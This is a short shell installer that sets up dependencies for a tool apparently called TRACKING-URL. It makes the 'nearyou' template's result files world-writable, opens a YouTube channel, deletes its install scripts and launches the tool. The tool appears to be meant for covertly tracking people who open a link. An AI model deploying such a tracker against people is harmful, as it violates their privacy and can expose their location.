echo '[!] Updating...'
pacman -Sy > install.log
echo
echo '[!] Installing Dependencies...'
echo '    Python3'
yes | pacman -S python3 python-pip --needed &>> install.log
echo '    PHP'
yes | pacman -S php --needed &>> install.log
echo '    ssh'
yes | pacman -S openssh --needed &>> install.log
echo '    Requests'
pip3 install requests &>> install.log
echo
echo '[!] Setting Permissions...'
chmod 777 template/nearyou/php/info.txt
chmod 777 template/nearyou/php/result.txt
echo

echo '[!] Installed.'
am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCLTkYtIJaFAopdiJ5ZqPQAw
cd $HOME/TRACKING-URL
rm install.sh
rm arch_install.sh
rm termux_install.sh
python tracking-url.py

